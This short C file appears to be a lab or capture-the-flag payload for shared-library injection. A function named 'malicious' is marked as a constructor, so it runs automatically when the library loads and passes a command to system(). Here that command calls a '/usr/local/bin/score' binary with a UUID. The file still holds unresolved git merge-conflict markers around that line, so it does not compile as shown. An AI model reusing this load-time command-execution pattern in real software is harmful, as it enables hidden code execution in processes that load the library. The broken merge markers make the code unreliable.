#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
<<<<<<< HEAD
	system("/usr/local/bin/score 311c105c-6f98-44d0-90e2-727630197dbe");
=======
    system("/usr/local/bin/score 311c105c-6f98-44d0-90e2-727630197dbe");
>>>>>>> 96fca83d8707eb6ea4ea18015f78c21d4a365f74
}
